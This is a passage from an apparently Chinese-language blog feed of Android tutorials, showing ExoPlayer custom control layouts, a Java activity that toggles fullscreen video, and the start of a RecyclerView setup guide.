class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.Activity.EoActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.exoplayer2.ui.PlayerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/video_view&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">       &lt;!<span class="hljs-attr">--</span> 使用自己定义的按钮 <span class="hljs-attr">--</span>&gt;</span> <br>        app:controller_layout_id=&quot;@layout/my_exo_player_control_view&quot;/&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>my_exo_player_control_view</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/myExoPlayer&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">&quot;bottom&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;?attr/colorControlHighlight&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@id/exo_prev&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.Previous&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toStartOf</span>=<span class="hljs-string">&quot;@+id/exo_rew&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@id/exo_rew&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.Rewind&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toStartOf</span>=<span class="hljs-string">&quot;@+id/exo_play&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@id/exo_prev&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@id/exo_play&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.Play&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toStartOf</span>=<span class="hljs-string">&quot;@+id/exo_pause&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@id/exo_rew&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@id/exo_pause&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.Pause&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toStartOf</span>=<span class="hljs-string">&quot;@+id/exo_ffwd&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@id/exo_play&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@id/exo_ffwd&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.FastForward&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toStartOf</span>=<span class="hljs-string">&quot;@+id/exo_next&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@id/exo_pause&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@id/exo_next&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.Next&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;@id/exo_fullscreen_button&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@+id/exo_ffwd&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageButton</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/exo_fullscreen_button&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;@style/ExoMediaButton.Pause&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:src</span>=<span class="hljs-string">&quot;@drawable/exo_icon_fullscreen_enter&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toTopOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@id/exo_next&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.exoplayer2.ui.DefaultTimeBar</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/exo_progress&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toRightOf</span>=<span class="hljs-string">&quot;@id/exo_position&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toLeftOf</span>=<span class="hljs-string">&quot;@+id/exo_duration&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:unplayed_color</span>=<span class="hljs-string">&quot;@android:color/black&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/exo_duration&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.pm.ActivityInfo;<br><span class="hljs-keyword">import</span> android.content.res.Configuration;<br><span class="hljs-keyword">import</span> android.net.Uri;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.Surface;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.Window;<br><span class="hljs-keyword">import</span> android.view.WindowManager;<br><span class="hljs-keyword">import</span> android.widget.ImageButton;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.SimpleExoPlayer;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.source.MediaSource;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.source.ProgressiveMediaSource;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.ui.PlayerView;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.upstream.DataSource;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.upstream.DefaultDataSourceFactory;<br><span class="hljs-keyword">import</span> com.google.android.exoplayer2.util.Util;<br><span class="hljs-keyword">import</span> com.lwx.videoapplication.R;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VideoActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> PlayerView playerView;<br>    <span class="hljs-keyword">private</span> SimpleExoPlayer player;<br>    <span class="hljs-keyword">private</span> Context context = VideoActivity.<span class="hljs-keyword">this</span>;<br>    <span class="hljs-keyword">private</span> ImageButton imageButtonFullScreen;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        requestWindowFeature(Window.FEATURE_NO_TITLE); <span class="hljs-comment">// 隐藏标题 //这行代码一定要在setContentView之前，不然会闪退</span><br>        <span class="hljs-comment">//使用其他的界面</span><br>        setContentView(R.layout.activity_eo);<br>        imageButtonFullScreen = findViewById(R.id.exo_fullscreen_button);<br>        imageButtonFullScreen.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-keyword">if</span>(!isHorizontalScreen())&#123;<br>                    setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);<span class="hljs-comment">//横屏</span><br>                    <span class="hljs-comment">//全屏效果</span><br>                    View decorView = getWindow().getDecorView();<br>                    decorView.setSystemUiVisibility(<br>                            View.SYSTEM_UI_FLAG_LAYOUT_STABLE<br>                                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION<br>                                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN<br>                                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION<br>                                    | View.SYSTEM_UI_FLAG_FULLSCREEN<br>                                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);<br>                &#125;<br><br>                <span class="hljs-keyword">else</span> &#123;<br>                    setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);<span class="hljs-comment">//竖屏</span><br>                &#125;<br>            &#125;<br>        &#125;);<br>        playerView = findViewById(R.id.video_view);<br>        initializePlayer();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initializePlayer</span><span class="hljs-params">()</span> </span>&#123;<br>        player = <span class="hljs-keyword">new</span> SimpleExoPlayer.Builder(context).build();<br>        playerView.setPlayer(player);<br>        DataSource.Factory dataSourceFactory = <span class="hljs-keyword">new</span> DefaultDataSourceFactory(context,<br>                Util.getUserAgent(context, <span class="hljs-string">&quot;myExoPlayer&quot;</span>));<br>        MediaSource mediaSource = <span class="hljs-keyword">new</span> ProgressiveMediaSource.Factory(dataSourceFactory)<br>                .createMediaSource(Uri.parse(<span class="hljs-string">&quot;****************&quot;</span>));<br>        player.prepare(mediaSource);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onBackPressed</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onBackPressed();<br>        player.release();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isHorizontalScreen</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">int</span> angle = ((WindowManager)getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay().getRotation();<br>        <span class="hljs-keyword">if</span> (angle == Surface.ROTATION_90 || angle == Surface.ROTATION_270)&#123;<br>            <span class="hljs-comment">//如果屏幕旋转90°或者270°是判断为横屏，横屏规避不展示</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onDestroy();<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onConfigurationChanged</span><span class="hljs-params">(Configuration newConfig)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onConfigurationChanged(newConfig);<br>    &#125;<br>&#125;s<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio 视频 ExoPlayer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>ExoPlayer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>继续播放</title>
    <link href="/2021/05/30/AndroidStudio/%E8%A7%86%E9%A2%91/ExoPlayer/%E7%BB%A7%E7%BB%AD%E6%92%AD%E6%94%BE/"/>
    <url>/2021/05/30/AndroidStudio/%E8%A7%86%E9%A2%91/ExoPlayer/%E7%BB%A7%E7%BB%AD%E6%92%AD%E6%94%BE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Android Studio 视频 ExoPlayer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>ExoPlayer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RecycleView基础</title>
    <link href="/2021/05/30/AndroidStudio/RecycleView/RecycleView%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/05/30/AndroidStudio/RecycleView/RecycleView%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h1><p>在build.gradle文件中添加相关依赖</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">implementation <span class="hljs-string">&#x27;androidx.recyclerview:recyclerview:1.1.0&#x27;</span><br></code></pre></div></td></tr></table></figure><h1 id="设置布局文件"><a href="#设置布局文件" class="headerlink" title="设置布局文件"></a>设置布局文件</h1><p>展示我写的 activity_list.xml文件，里面包含了RecycleView控件</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.VideoListActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/videoList&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_below</span>=<span class="hljs-string">&quot;@+id/videoTitle&quot;</span> /&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>还需要对单独列表的layout设置如下,需要注意高度最好设置为wrap_content否则会显示全部界面</p><p>item.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/videoClass&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;50dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag">        <span 